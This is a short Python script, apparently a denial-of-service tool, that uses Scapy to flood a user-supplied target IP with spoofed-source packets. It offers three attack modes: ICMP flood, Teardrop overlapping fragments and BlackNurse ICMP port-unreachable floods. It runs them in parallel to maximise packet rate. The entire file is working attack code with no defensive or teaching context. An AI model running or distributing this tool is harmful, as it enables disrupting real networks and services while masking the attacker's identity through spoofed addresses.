from scapy.layers.inet import ICMP, IP
from scapy.all import *
import multiprocessing
import time
import random

dst_ip = input("IP to attack: ")
n_ips = input("\nNumber of IPs: ")
n_msg = input("\nNumber of messages per IP: ")
attack_type = input(
    "\nSelect type: \n1) ICMP Flood \n2) Teardrop \n3) Black nurse\nYour choice: ")
threads = 12  # Default value

ips = []


def get_random_ips(n):
    for i in range(0, int(n)):
        ip_gen = ".".join(str(random.randint(0, 255)) for _ in range(4))
        ips.append(ip_gen)


load = "X" * 150


def send_packet_flood(origin_ip):
    send((IP(dst=dst_ip, src=origin_ip) / ICMP() / load) * int(n_msg), verbose=False)


def send_packet_teardrop(origin_ip):
    frag1 = IP(dst=dst_ip, src=origin_ip, flags="MF", frag=0) / ICMP() / b"X" * 8
    frag2 = IP(dst=dst_ip, src=origin_ip, flags="MF", frag=3) / ICMP() / b"Y" * 8
    send(frag1 * int(n_msg), verbose=False)
    send(frag2 * int(n_msg), verbose=False)


def send_packet_black_nurse(origin_ip):
    send((IP(dst=dst_ip, src=origin_ip) / ICMP(type=3, code=3)) * int(n_msg), verbose=False)
    # type 3 - destination unreachable, code 3 - reason is, port unreachable


get_random_ips(n_ips)

# With threading
t0 = time.time()

p = multiprocessing.Pool(threads)
if attack_type == "1":
    p.map(func=send_packet_flood, iterable=ips)
elif attack_type == "2":
    p.map(func=send_packet_teardrop, iterable=ips)
elif attack_type == "3":
    p.map(func=send_packet_black_nurse, iterable=ips)
else:
    print("Type unknown")
p.close()

total_s = float(time.time() - t0)
total_p = int(n_ips) * int(n_msg)
ratio = float(total_p) / float(total_s)
print("\nTotal: \nTime:\t%d seconds" % total_s)
print("Packets:\t%d \nSpeed:\t%d p/s" % (total_p, ratio))
